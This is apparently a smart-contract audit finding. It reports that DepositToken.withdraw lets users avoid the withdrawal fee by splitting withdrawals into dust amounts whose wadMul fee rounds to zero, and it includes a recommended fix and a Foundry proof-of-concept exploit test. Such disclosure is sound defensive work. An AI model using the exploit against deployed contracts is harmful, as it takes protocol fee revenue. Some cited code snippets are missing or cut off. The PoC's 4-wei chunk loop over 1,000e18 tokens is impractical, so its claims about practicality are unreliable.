### Title
`DepositToken.withdraw` allows fee-free withdrawals by splitting into dust-sized chunks whose fee rounds to zero - (File: contracts/DepositToken.sol)

### Summary
The withdrawal fee is computed as `amount_.wadMul(withdrawFee)` in `quoteWithdrawOut`, where `wadMul` rounds half-up to the nearest wei. Any withdrawal amount small enough that `amount_ * withdrawFee < HALF_WAD` (0.5e18) yields a fee of exactly 0, and `_withdraw` explicitly skips the fee transfer when `_fee == 0`. An unprivileged user can therefore split a large withdrawal into many dust-sized calls and pay no fee to the fee collector at all — the same bug class as the Derby `withdrawalRequest` fee-evasion report.

### Finding Description
`DepositToken.withdraw(amount_, to_)` is a public entry point that only checks `_revertIfLocked` and forwards to `_withdraw`: [1](#0-0) 

`_withdraw` quotes the fee and only transfers it to `feeCollector` if it is nonzero: [2](#0-1) 

The quote uses `wadMul`: [3](#0-2) 

`wadMul` computes `(a * b + HALF_WAD) / WAD`, so the result is `0` whenever `a * b < 0.5e18`: [4](#0-3) 

For example, with `withdrawFee = 0.1e18` (10%), any `amount_ <= 4` wei produces `_fee == 0`. The only nonzero check is `if (amount_ == 0) revert AmountIsZero()` — there is no minimum withdrawal amount or minimum-fee enforcement. Nothing else blocks the path: `whenNotShutdown`/`nonReentrant`/`onlyIfDepositTokenExists` do not prevent repeated small calls, and `_revertIfLocked` only constrains callers with outstanding debt. Calls can be batched cheaply through the meta-sender/operator multicall surface to amortize gas.

### Impact Explanation
The fee-collection invariant breaks: a user can withdraw their full collateral balance while paying zero withdraw fee, directly depriving the fee collector/DAO of protocol revenue on every withdrawal. This is repeatable by any depositor, so aggregate fee leakage scales with total withdrawal volume whenever `withdrawFee > 0`.

### Likelihood Explanation
Any EOA holding unlocked deposit tokens can execute this with no special permissions — it requires only repeated `withdraw` calls (or batched calls via the operator/gateway multicall path). The exploit is deterministic arithmetic, not dependent on market conditions, oracle manipulation, or privileged roles. Its practicality depends on gas costs relative to the fee saved; batching via multicall and doing it on low-fee chains makes it profitable whenever the avoided fee exceeds the marginal call cost, and it guarantees a nonzero fee is avoided on every chunk rather than the statistically-expected fee.

### Recommendation
Enforce a minimum fee outcome: either round the fee up (`_fee = (amount_ * withdrawFee + WAD - 1) / WAD` so any nonzero `amount_` with `withdrawFee > 0` yields at least 1 wei), or revert withdrawals where the computed fee rounds to zero while `withdrawFee > 0`, or impose a minimum withdrawal amount such that `minAmount * withdrawFee >= HALF_WAD`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
// assumes deployed Pool, FeeProvider, DepositToken (msdMET), underlying MET
// and a deposit token whose underlying is an 18-decimal ERC20.

contract DustFeeEvasionTest is Test {
    function test_dustWithdrawalsPayZeroFee() public {
        // governor configures a nonzero withdraw fee, e.g. 10%
        vm.prank(governor);
        feeProvider.updateWithdrawFee(0.1e18);

        uint256 depositAmount = 1_000e18;
        deal(address(met), attacker, depositAmount);
        vm.startPrank(attacker);
        met.approve(address(metDepositToken), depositAmount);
        metDepositToken.deposit(depositAmount, attacker);

        // chunk size s such that s * 0.1e18 < 0.5e18  =>  s <= 4 wei is the
        // extreme case; larger chunk sizes also round the *marginal* wei down.
        uint256 chunk = 4;
        uint256 feeCollectorBefore = metDepositToken.balanceOf(feeCollector);
        uint256 metBefore = met.balanceOf(attacker);

        while (metDepositToken.balanceOf(attacker) >= chunk) {
            metDepositToken.withdraw(chunk, attacker);
        }
        // remainder
        uint256 rem = metDepositToken.balanceOf(attacker);
        if (rem > 0) metDepositToken.withdraw(rem, attacker);

        vm.stopPrank();

        // attacker recovered ~full deposit, fee collector got 0
        assertEq(metDepositToken.balanceOf(feeCollector), feeCollectorBefore);
        assertApproxEqAbs(met.balanceOf(attacker), metBefore + depositAmount, chunk);
    }
}
```
In practice the attacker chooses the largest chunk size that still yields fee 0 for the configured `withdrawFee`, minimizing the number of calls; the loop can also be wrapped in an `Operator.execute`-style multicall to amortize gas.

```text
    function quoteWithdrawOut(uint256 amount_) public view override returns (uint256 _amountToWithdraw, uint256 _fee) {
        uint256 _withdrawFee = pool.feeProvider().withdrawFee();
        if (_withdrawFee == 0) {
            return (amount_, _fee);
        }

        _fee = amount_.wadMul(_withdrawFee);
        _amountToWithdraw = amount_ - _fee;
    }
```

```text
        if (a == 0 || b == 0) {
            return 0;
```
